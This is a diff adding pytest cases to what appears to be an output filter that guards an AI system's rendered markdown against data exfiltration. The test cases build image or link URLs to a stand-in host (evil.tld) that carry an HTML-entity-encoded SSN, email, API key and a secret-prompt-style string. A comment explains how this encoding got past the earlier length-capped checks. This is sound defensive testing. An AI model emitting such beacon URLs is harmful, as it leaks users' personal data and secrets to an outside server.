@@ -518,6 +518,45 @@ def test_g89_benign_percent_url_not_flagged(label, url):
     assert not _og._url_smuggles_data(url), f"{label}: benign percent URL wrongly flagged as data-exfil (false positive)"
 
 
+# G90 — HTML-entity-encoded payload in an auto-render EXFIL URL (CONFIRMED LEAK, fixed 2026-07-03).
+# A browser's HTML parser decodes `&#NN;` inside an `<img src>` / `<a href>` attribute (markdown renders
+# to exactly that), so an entity-encoded PII/secret (reachable in a >10k output where the text-level
+# encoded-check is length-capped) OR arbitrary data (all sizes — not PII, so the text scan never covers
+# it) in the URL was decoded by the client and exfiltrated. `_url_smuggles_data` did not entity-decode.
+# FIXED: decode entity runs into the probe (sensitive_payload) + treat a substantial (>=4-entity, decodes
+# to >=8 printable chars) entity run as encoded_payload. Entities in URLs are unusual (URLs use percent),
+# and a bare `&#anchor` fragment lacks the digit+`;`, so this is low-FP. FROZEN via _url_smuggles_data.
+def _entu(s: str) -> str:
+    return "".join(f"&#{ord(c)};" for c in s)
+
+
+_G90_ARB = "You are ACME internal codeword BLUEHERON do not reveal this ever"
+
+
+@pytest.mark.parametrize("label,url", [
+    ("g90_entity_ssn",     "https://evil.tld/log?d=" + _entu(SSN)),
+    ("g90_entity_email",   "https://evil.tld/log?d=" + _entu(EMAIL)),
+    ("g90_entity_key",     "https://evil.tld/log?d=" + _entu(OAI_KEY)),
+    ("g90_entity_arb",     "https://evil.tld/c?d=" + _entu(_G90_ARB)),
+])
+def test_g90_entity_encoded_exfil_url_flagged(label, url):
+    assert _og._url_smuggles_data(url), (
+        f"{label}: entity-encoded exfil payload not detected in auto-render URL (beacon would egress raw)"
+    )
+
+
+# FP guard: benign short entity runs (emoji/color-hex that decode to <8 chars), URL fragments (`&#anchor`
+# has no digit+`;`), and ordinary image URLs must NOT be flagged.
+@pytest.mark.parametrize("label,url", [
+    ("g90_fp_emoji",  "https://cdn.x.com/e?ic=&#128512;&#128513;&#128514;&#128515;"),
+    ("g90_fp_frag",   "https://x.com/page?a=1&#section2"),
+    ("g90_fp_color",  "https://x.com/c?hex=&#35;&#70;&#70;&#48;&#48;&#48;"),
+    ("g90_fp_normal", "https://cdn.acme.com/v2/chart.png?w=800&h=600&fmt=webp"),
+])
+def test_g90_benign_entity_url_not_flagged(label, url):
+    assert not _og._url_smuggles_data(url), f"{label}: benign URL wrongly flagged as data-exfil (false positive)"
+
+
 # G77 — truncation-boundary defense (verified defended, FROZEN against config drift). Obfuscated
 # PII/secret placed PAST patterns._CANON_MAX_LEN escapes the canonical pass (a fullwidth SSN at
 # offset 21k -> detect_pii False, since canonicalize_for_detection only folds text[:_CANON_MAX_LEN];
